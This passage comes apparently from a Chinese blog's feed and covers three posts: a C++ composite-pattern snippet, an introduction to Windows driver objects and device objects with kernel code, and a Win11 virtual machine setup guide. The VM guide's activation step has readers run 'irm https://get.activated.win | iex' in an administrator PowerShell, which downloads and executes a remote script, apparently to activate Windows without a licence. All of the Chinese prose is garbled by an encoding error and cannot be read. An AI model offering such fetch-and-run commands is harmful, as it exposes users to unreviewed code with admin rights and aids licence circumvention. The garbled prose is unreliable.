class="params">(std::shared_ptr&lt;Effect&gt;&amp;x)</span></span>&#123;</span><br><span class="line">        ce.<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseCard</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">std::string name;</span><br><span class="line">std::string description;</span><br><span class="line"><span class="type">size_t</span> id;</span><br><span class="line">dword cost;</span><br><span class="line">std::shared_ptr&lt;CaposEffect&gt; effects;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onHandTurnStart</span><span class="params">()</span></span>&#123;</span><br><span class="line">        effects-&gt;<span class="built_in">onHandTurnStart</span>();</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        effects-&gt;<span class="built_in">onUse</span>();</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">addEffect</span><span class="params">(std::shared_ptr&lt;Effect&gt;&amp;x)</span></span>&#123;</span><br><span class="line">        effects.<span class="built_in">addEffect</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myCard</span> : <span class="keyword">public</span> BaseCard&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        player.<span class="built_in">heal</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å®ç°äº†ä¸¤ç§å¯¹è±¡ä¹‹é—´çš„è§£è€¦ï¼Œä¸”å¯ä»¥ä¸ºeffectåˆ›å»ºeffectç»„ï¼Œå®ç°å¤šç§æ•ˆæœçš„ç»„åˆã€‚</p>]]></content>
    
    
    <summary type="html">ç»„åˆæ¨¡å¼</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="å¼€å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="é¢å‘å¯¹è±¡åŸºç¡€" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="OOP" scheme="https://www.pri87.vip/tags/OOP/"/>
    
  </entry>
  
  <entry>
    <title>é©±åŠ¨å¼€å‘å…¥é—¨</title>
    <link href="https://www.pri87.vip/posts/d2620136.html"/>
    <id>https://www.pri87.vip/posts/d2620136.html</id>
    <published>2025-03-09T10:17:34.000Z</published>
    <updated>2025-03-10T14:40:41.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="é©±åŠ¨">é©±åŠ¨</h2><p>åœ¨Windowsä¸­ï¼Œé©±åŠ¨æ˜¯è¿è¡Œåœ¨å†…æ ¸(R0å±‚)çš„è½¯ä»¶ã€‚ç”±äºè¿è¡Œåœ¨å†…æ ¸å±‚ï¼Œæ‰€ä»¥å¯ä»¥åšæ“ä½œç³»ç»Ÿå¯ä»¥åšçš„ç»å¤§å¤šæ•°äº‹æƒ…ï¼Œæ¯”å¦‚å’Œç¡¬ä»¶è¿›è¡Œäº¤äº’ï¼Œå°±å¿…é¡»åœ¨å†…æ ¸ä¸­æ‰§è¡Œã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé©±åŠ¨éƒ½æ˜¯ç”¨æ¥å®ç°æŸè®¾å¤‡çš„IOæ“ä½œçš„ã€‚</p><h3 id="åˆ†ç±»">åˆ†ç±»</h3><p>é©±åŠ¨åˆ†ä¸ºå¦‚ä¸‹å‡ ç§ç±»å‹ï¼š</p><ul><li>è®¾å¤‡å‡½æ•°é©±åŠ¨ç¨‹åº<ul><li>å®ç°ç¡¬ä»¶è®¾å¤‡çš„é€»è¾‘ï¼Œæ¯”å¦‚è®¾å¤‡çš„åˆå§‹åŒ–å’Œæ•°æ®ä¼ è¾“ç­‰</li><li>ä¸€èˆ¬ä¸ºç¡¬ä»¶åˆ¶é€ å•†å¼€å‘</li><li>ä¾‹ï¼šé”®ç›˜é©±åŠ¨ç¨‹åºï¼Œæ˜¾ç¤ºé©±åŠ¨ç¨‹åºï¼Œæ‰“å°æœºé©±åŠ¨ç¨‹åº</li></ul></li><li>è®¾å¤‡ç­›é€‰å™¨é©±åŠ¨ç¨‹åº<ul><li>è®¾å¤‡ç­›é€‰å™¨æ˜¯ç”¨æ¥ä¿®æ”¹æˆ–æ‰©å±•è®¾å¤‡å‡½æ•°é©±åŠ¨çš„è¡Œä¸ºçš„é©±åŠ¨ï¼Œåˆ†ä¸ºä¸Šå±‚è¿‡æ»¤å™¨å’Œä¸‹å±‚è¿‡æ»¤å™¨</li><li>å¯ä»¥æ‹¦æˆªæˆ–ä¿®æ”¹è®¾å¤‡çš„æ“ä½œï¼Œç±»ä¼¼ä¸é’©å­</li><li>ä¾‹ï¼šæ‹¦æˆªå’Œè®°å½•USBè®¾å¤‡é€šä¿¡çš„é©±åŠ¨ç¨‹åº</li></ul></li><li>è½¯ä»¶é©±åŠ¨ç¨‹åº<ul><li>ä¸ºé€»è¾‘è®¾å¤‡æœåŠ¡çš„é©±åŠ¨ç¨‹åºï¼Œå®ç°è™šæ‹Ÿè®¾å¤‡æˆ–ç³»ç»ŸåŠŸèƒ½</li><li>å®ç°è™šæ‹ŸåŠŸèƒ½å¹¶å¤„ç†é«˜å±‚é€»è¾‘è€Œéç¡¬ä»¶äº¤äº’ã€‚</li><li>ä¾‹ï¼šè™šæ‹Ÿç£ç›˜ï¼Œè™šæ‹Ÿç½‘å¡</li></ul></li><li>æ–‡ä»¶ç³»ç»Ÿç­›é€‰å™¨é©±åŠ¨ç¨‹åº<ul><li>ç”¨æ¥ç›‘æ§ï¼Œä¿®æ”¹æˆ–å¢å¼ºæ–‡ä»¶ç³»ç»Ÿçš„è¡Œä¸ºçš„é©±åŠ¨ï¼Œé™„åŠ åœ¨æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨å †æ ˆä¸­ï¼Œå¯ä»¥æ‹¦æˆªæ–‡ä»¶æ“ä½œçš„IOæ“ä½œ</li><li>æ£€æŸ¥ä¿®æ”¹æ–‡ä»¶æ“ä½œï¼Œæ‰“å¼€è¯»å–å†™å…¥ç­‰ï¼Œæ‰§è¡Œæƒé™æ§åˆ¶ï¼ŒåŠ å¯†ï¼Œæ•°æ®å‹ç¼©ç­‰</li><li>ä¾‹ï¼šé˜²æ­¢æœªæˆæƒè®¿é—®æ–‡ä»¶</li></ul></li><li>æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åº<ul><li>å®ç°æ–‡ä»¶æ“ä½œé€»è¾‘çš„é©±åŠ¨(NTFS,FAT32ç­‰)ï¼Œæ–‡ä»¶ç³»ç»Ÿå †æ ˆä¸­çš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œç›´æ¥ç®¡ç†ç£ç›˜ä¸Šçš„æ–‡ä»¶</li><li>å®ç°æ–‡ä»¶è¯»å†™ï¼Œè·¯å¾„è§£æï¼Œç›®å½•ç®¡ç†</li><li>ä¾‹ï¼šWindowsä¸­çš„ntfs.syså’Œfat32.sys</li></ul></li></ul><h3 id="é©±åŠ¨å¯¹è±¡å’Œè®¾å¤‡å¯¹è±¡">é©±åŠ¨å¯¹è±¡å’Œè®¾å¤‡å¯¹è±¡</h3><h4 id="é©±åŠ¨å¯¹è±¡">é©±åŠ¨å¯¹è±¡</h4><p>æ“ä½œç³»ç»Ÿæ ‡è¯†ä¸€ä¸ªé©±åŠ¨çš„æ•°æ®ç»“æ„</p><p>è¯¥å¯¹è±¡ç”±æ“ä½œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆ(ä¸‹é¢æ˜¯WDM)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(PDRIVER_OBJECT pdriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverUnload\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject,</span></span><br><span class="line"><span class="params">PUNICODE_STRING pRegPath<span class="comment">//æ³¨å†Œè¡¨è·¯å¾„</span></span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">DbgPrint(<span class="string">&quot;DriverEntry\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">pDriverObject-&gt;DriverUnload = DriverUnload;<span class="comment">//æŒ‡å®šé©±åŠ¨å¸è½½å‡½æ•°</span></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¹‹ä¸­pDriverObjectæ˜¯æ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªé©±åŠ¨åˆ›å»ºçš„é©±åŠ¨å¯¹è±¡ï¼Œéƒ¨åˆ†å†…å®¹éœ€è¦åœ¨DriverEntryä¸­ç”±ç”¨æˆ·æ·»åŠ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> &#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following links all of the devices created by a single driver</span></span><br><span class="line">    <span class="comment">// together on a list, and the Flags word provides an extensible flag</span></span><br><span class="line">    <span class="comment">// location for driver objects.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    ULONG Flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section describes where the driver is loaded.  The count</span></span><br><span class="line">    <span class="comment">// field is used to count the number of times the driver has had its</span></span><br><span class="line">    <span class="comment">// registered reinitialization routine invoked.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The driver name field is used by the error log thread</span></span><br><span class="line">    <span class="comment">// determine the name of the driver that an I/O request is/was bound.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    UNICODE_STRING DriverName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section is for registry support.  This is a pointer</span></span><br><span class="line">    <span class="comment">// to the path to the hardware information in the registry</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PUNICODE_STRING HardwareDatabase;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section contains the optional pointer to an array of</span></span><br><span class="line">    <span class="comment">// alternate entry points to a driver for &quot;fast I/O&quot; support.  Fast I/O</span></span><br><span class="line">    <span class="comment">// is performed by invoking the driver routine directly with separate</span></span><br><span class="line">    <span class="comment">// parameters, rather than using the standard IRP call mechanism.  Note</span></span><br><span class="line">    <span class="comment">// that these functions may only be used for synchronous I/O, and when</span></span><br><span class="line">    <span class="comment">// the file is cached.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// The following section describes the entry points to this particular</span></span><br><span class="line">    <span class="comment">// driver.  Note that the major function dispatch table must be the last</span></span><br><span class="line">    <span class="comment">// field in the object so that it remains extensible.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">    PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">&#125; DRIVER_OBJECT;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span> </span><br></pre></td></tr></table></figure><p>åœ¨cä¸­ï¼Œå®ƒçš„å®šä¹‰å’Œå¯è¡Œçš„æ“ä½œå¦‚ä¸Š</p><p>å¯ä»¥çœ‹å‡ºæ“ä½œç³»ç»Ÿç”¨ä¸€ä¸ªå•é“¾è¡¨è¿æ¥äº†æ‰€æœ‰çš„è®¾å¤‡å¯¹è±¡ã€‚ä¸”ä½¿ç”¨äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">PDRIVER_STARTIO DriverStartIo;</span><br><span class="line">PDRIVER_UNLOAD DriverUnload;</span><br><span class="line">PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>æ¥ä¸ºæ“ä½œç³»ç»Ÿè°ƒç”¨é©±åŠ¨ä¸­çš„å‡½æ•°æä¾›äº†åŸºç¡€ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œä¸€ä¸ªé©±åŠ¨æ³¨å†Œå¥½äº†åï¼Œä¼šå’Œå…¶å®ƒåŒç±»é©±åŠ¨ç»„åˆæˆé©±åŠ¨æ ˆï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åœ°å¤„ç†ä¸åŒå±‚çº§çš„é—®é¢˜ï¼Œæ¯å½“å¼•å‘ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šä»é«˜åˆ°ä½è¯¢é—®è¦ä¸è¦å¤„ç†ï¼Œå¦‚æœä¸å¤„ç†å°±ä¼šç»§ç»­å‘ä¸‹ï¼Œå¦‚æœå¤„ç†ï¼Œé‚£ä¹ˆå°±æ­¤ç»ˆæ­¢ï¼Œä¸ä¼šç»§ç»­ä¼ é€’ã€‚</p><h4 id="è®¾å¤‡å¯¹è±¡">è®¾å¤‡å¯¹è±¡</h4><p>è®¾å¤‡å¯¹è±¡æ˜¯æ“ä½œå¯¹è±¡ç”¨æ¥æè¿°ä¸€ä¸ªè®¾å¤‡çš„æ ¸å¿ƒæ•°æ®ç»“æ„ã€‚å¯ä»¥æ ‡è¯†å¹¶ç®¡ç†ç¡¬ä»¶è®¾å¤‡æˆ–é€»è¾‘è®¾å¤‡ã€‚</p><p>éœ€è¦è‡ªåˆ›å»º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT DriverObject,</span></span><br><span class="line"><span class="params">    _In_ PUNICODE_STRING RegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">    NTSTATUS Status = IoCreateDevice(</span><br><span class="line">        DriverObject,            <span class="comment">// æ‰€å±é©±åŠ¨å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">sizeof</span>(DEVICE_EXTENSION), <span class="comment">// è®¾å¤‡æ‰©å±•çš„å¤§å°</span></span><br><span class="line">        &amp;DeviceName,             <span class="comment">// è®¾å¤‡åç§°</span></span><br><span class="line">        FILE_DEVICE_UNKNOWN,     <span class="comment">// è®¾å¤‡ç±»å‹</span></span><br><span class="line">        <span class="number">0</span>,                       <span class="comment">// ç‰¹æ€§æ ‡å¿—</span></span><br><span class="line">        FALSE,                   <span class="comment">// æ˜¯å¦ä¸ºç‹¬å è®¾å¤‡</span></span><br><span class="line">        &amp;DeviceObject            <span class="comment">// è¾“å‡ºè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(Status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status; <span class="comment">// åˆ›å»ºå¤±è´¥æ—¶è¿”å›é”™è¯¯çŠ¶æ€</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ PDRIVER_OBJECT pDriverObject,</span></span><br><span class="line"><span class="params">    _In_ PUNICODE_STRING pRegistryPath</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    PDEVICE_OBJECT pDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(<span class="string">L&quot;\\Device\\FileFilter&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ›å»ºè®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    status = IoCreateDevice(</span><br><span class="line">        pDriverObject,          <span class="comment">// é©±åŠ¨å¯¹è±¡</span></span><br><span class="line">        <span class="number">0</span>,                      <span class="comment">// æ²¡æœ‰è®¾å¤‡æ‰©å±•</span></span><br><span class="line">        &amp;deviceName,            <span class="comment">// è®¾å¤‡å</span></span><br><span class="line">        FILE_DEVICE_DISK_FILE_SYSTEM, <span class="comment">// æŒ‡å®šä¸ºæ–‡ä»¶ç³»ç»Ÿç±»å‹</span></span><br><span class="line">        <span class="number">0</span>,                      <span class="comment">// æ— ç‰¹æ®Šç‰¹æ€§</span></span><br><span class="line">        FALSE,                  <span class="comment">// éç‹¬å </span></span><br><span class="line">        &amp;pDeviceObject          <span class="comment">// è¾“å‡ºè®¾å¤‡å¯¹è±¡æŒ‡é’ˆ</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;Failed to create device object\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å¸è½½å‡½æ•°å’Œå…¶ä»–åˆå§‹åŒ–é€»è¾‘</span></span><br><span class="line">    pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = FileCreateHandler; <span class="comment">// å¤„ç†æ–‡ä»¶åˆ›å»º</span></span><br><span class="line">    pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = FileReadHandler;     <span class="comment">// å¤„ç†æ–‡ä»¶è¯»å–</span></span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;Device object created successfully\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DriverUnload</span><span class="params">(_In_ PDRIVER_OBJECT pDriverObject)</span> &#123;</span><br><span class="line">    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(<span class="string">L&quot;\\Device\\FileFilter&quot;</span>);</span><br><span class="line">    IoDeleteDevice(pDriverObject-&gt;DeviceObject); <span class="comment">// åˆ é™¤è®¾å¤‡å¯¹è±¡</span></span><br><span class="line">    DbgPrint(<span class="string">&quot;Driver unloaded\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IRP_MJ_CREATE å’Œ IRP_MJ_READ æ˜¯ I/O è¯·æ±‚åŒ…ï¼ˆIRPï¼‰çš„ä¸»åŠŸèƒ½ç ï¼Œåˆ†åˆ«å¯¹åº”æ–‡ä»¶/è®¾å¤‡çš„åˆ›å»ºï¼ˆæˆ–æ‰“å¼€ï¼‰æ“ä½œå’Œè¯»å–æ“ä½œã€‚å½“ç”¨æˆ·å±‚è°ƒç”¨ç›¸å…³ I/O æ“ä½œï¼ˆå¦‚ CreateFile æˆ– ReadFileï¼‰æ—¶ï¼Œæ“ä½œç³»ç»Ÿçš„ I/O ç®¡ç†å™¨ä¼šç”Ÿæˆå¯¹åº”çš„ IRPï¼Œå¹¶å°†å…¶ä¼ é€’åˆ°ç›®æ ‡è®¾å¤‡çš„é©±åŠ¨æ ˆä¸­ã€‚é©±åŠ¨ç¨‹åºé€šè¿‡åœ¨é©±åŠ¨å¯¹è±¡ä¸­æ³¨å†Œçš„è°ƒåº¦ä¾‹ç¨‹ï¼ˆDispatch Routineï¼‰å¤„ç†è¿™äº› IRP è¯·æ±‚ã€‚è°ƒåº¦ä¾‹ç¨‹ä¼šæŠŠä¸»åŠŸèƒ½ç æ˜ å°„ä¸ºMajorFunctionçš„ç´¢å¼•ï¼Œç„¶åé©±åŠ¨æŒ‡å®šå¯¹åº”ç´¢å¼•çš„å‡½æ•°æ¥å®ç°åŠŸèƒ½ã€‚</p>]]></content>
    
    
    <summary type="html">ä»‹ç»é©±åŠ¨åŸºæœ¬æ¦‚å¿µ</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="å¼€å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/"/>
    
    <category term="é©±åŠ¨å¼€å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E5%BC%80%E5%8F%91/%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="é©±åŠ¨" scheme="https://www.pri87.vip/tags/%E9%A9%B1%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title>Win11è™šæ‹Ÿæœºé…ç½®</title>
    <link href="https://www.pri87.vip/posts/a848d09.html"/>
    <id>https://www.pri87.vip/posts/a848d09.html</id>
    <published>2025-03-05T09:31:13.000Z</published>
    <updated>2025-03-10T05:57:59.772Z</updated>
    
    <content type="html"><![CDATA[<h2 id="iosä¸‹è½½">iosä¸‹è½½</h2><p><a href="https://next.itellyou.cn/Original/Index">Itellyou</a></p><h2 id="è™šæ‹Ÿæœº">è™šæ‹Ÿæœº</h2><p><a href="https://www.vmware.com/products">VMware</a></p><h2 id="å®‰è£…vmware-tools">å®‰è£…vmware tools</h2><p>è™šæ‹Ÿæœºæ•´ä¸ªå®‰è£…å¥½ä¹‹å(è¿›å…¥æ¡Œé¢)</p><p><img src="https://s2.loli.net/2025/03/05/q1o7PB8HZGiuNV6.png" alt="image-20250305212801916"></p><p>æ²¡æœ‰å®‰è£…çš„è¯ä¸ä¼šæ˜¯é‡æ–°å®‰è£…ï¼Œç‚¹å‡»åï¼ŒæŒ‰è™šæ‹Ÿæœºä¸­çš„æç¤ºå®‰è£…å³å¯ã€‚</p><h2 id="æ¿€æ´»">æ¿€æ´»</h2><p>ç®¡ç†å‘˜powershell:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">irm</span> https://get.activated.win | <span class="built_in">iex</span></span><br></pre></td></tr></table></figure><h2 id="è¿æ¥ä¸»æœºç½‘ç»œ">è¿æ¥ä¸»æœºç½‘ç»œ</h2><p>è™šæ‹Ÿæœºç½‘ç»œé€‰æ‹©netæ¨¡å¼ã€å…³é—­è™šæ‹Ÿæœºé˜²ç«å¢™</p><p>win+xç„¶åiæ‰§è¡Œipconfigï¼šEthernet0å°±æ˜¯è™šæ‹Ÿæœºæœ¬åœ°ip</p><p>ä¸»æœºç”¨åŒç†æ–¹æ³•å¯ä»¥å¾—åˆ°ipåœ°å€ï¼Œç›¸äº’pingæ¥æµ‹è¯•</p><p>æˆ–è€…ç›´æ¥<code>ping è®¡ç®—æœºå</code> ä¹Ÿå¯ä»¥</p><h2 id="é…ç½®è™šæ‹Ÿæœºwdkå’Œè¿æ¥">é…ç½®è™šæ‹Ÿæœºwdkå’Œè¿æ¥</h2><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/provision-a-target-computer-wdk-8-1">é¢„é…è®¡ç®—æœºä»¥ä¾¿è¿›è¡Œé©±åŠ¨ç¨‹åºéƒ¨ç½²å’Œæµ‹è¯• (WDK 10) - Windows drivers | Microsoft Learn</a></p><p>åœ¨è™šæ‹Ÿæœºä¸­å®‰è£…wdkï¼Œæ‰§è¡Œ<code>C:\Program Files (x86)\Windows Kits\10\Remote\x64\WDK Test Target Setup 